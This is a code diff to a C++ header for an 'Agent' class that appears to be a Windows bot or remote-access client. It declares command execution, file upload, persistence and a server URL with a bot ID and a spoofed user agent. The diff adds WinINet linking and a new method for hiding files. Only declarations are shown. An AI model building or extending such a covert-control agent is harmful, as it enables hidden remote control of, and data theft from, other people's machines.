@@ -1,16 +1,17 @@
 #pragma once
+#pragma comment (lib,"wininet.lib")
 
 #include <string>
 #include <Windows.h>
 #include <direct.h>
 #include <ctime>
 
-
 class Agent {
 
 public:
 
-	Agent(const std::string& _server_url, const std::string& _botid = "", const unsigned int _sleep_interval = 10, const std::string& _service_name = "agent", const std::string& _user_agent = "Mozilla/4.0 (compatible)");
+	Agent(const std::string& _server_url, const std::string& _botid = "", const unsigned int _sleep_interval = 10, const std::string& _service_name = "agent", 
+		const std::string& _user_agent = "Mozilla/4.0 (compatible)");
 
 	std::string run_command(const std::string& command, bool isLocal=false);
 	void cd(const std::string& newdir);
@@ -18,6 +19,7 @@ public:
 	void upload(const std::string& filename);
 	void persist(const std::string& options);
 	void open(const std::string& args);
+	void hide_unhide_file(const std::string& filename);
 	void help();
 	
 	void setInterval(const unsigned int new_interval);
